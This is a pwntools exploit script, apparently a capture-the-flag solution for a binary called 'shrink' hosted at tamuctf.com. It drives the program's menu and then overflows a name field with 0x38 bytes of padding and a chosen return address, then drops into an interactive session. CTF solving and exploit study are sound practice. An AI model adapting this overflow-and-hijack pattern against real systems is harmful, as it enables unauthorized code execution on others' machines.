from pwn import *

exe = './shrink'

(host,port_num) = ("tamuctf.com",443)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            [exe] + argv, gdbscript=gscpt, *a, **kw)
    elif args.RE:
        return remote("tamuctf.com", 443, ssl=True, sni="shrink")
    else:
        return process( 
            [exe] + argv, *a, **kw)
    
gscpt = (
    '''
# b *0x00000000004014a2
b *0x0000000000401418
'''
).format(**locals())

context.update(arch='amd64')

# SHORTHANDS FOR FNCS
se  = lambda nbytes     : p.send(nbytes)
sl  = lambda nbytes     : p.sendline(nbytes)
sa  = lambda msg,nbytes : p.sendafter(msg,nbytes)
sla = lambda msg,nbytes : p.sendlineafter(msg,nbytes)
rv  = lambda nbytes     : p.recv(nbytes)
rvu = lambda msg        : p.recvuntil(msg)
rvl = lambda            : p.recvline()

# SIMPLE PRETTY PRINTER
def w(*args):
    print(f"〔\033[1;32m>\033[0m〕",end="")
    for i in args:
        print(hex(i)) if(type(i) == int) else print(i,end=" ")
    print("")

# PWNTOOLS CONTEXT
context.log_level = \
    'DEBUG'

# _____________________________________________________ #
# <<<<<<<<<<<<<<< EXPLOIT STARTS HERE >>>>>>>>>>>>>>>>> #

p = start()

for i in range (0x50):
    rvu("Exit")
    sl(b"3")

rvu("Exit")
sl(b"2")
rvu("name:")
sl("")
rvu("Exit")
sl(b"2")
rvu("name:")
sl(0x38*b"b" + p64(0x0000000000401256))

rvu("Exit")
sl("4")

p.interactive()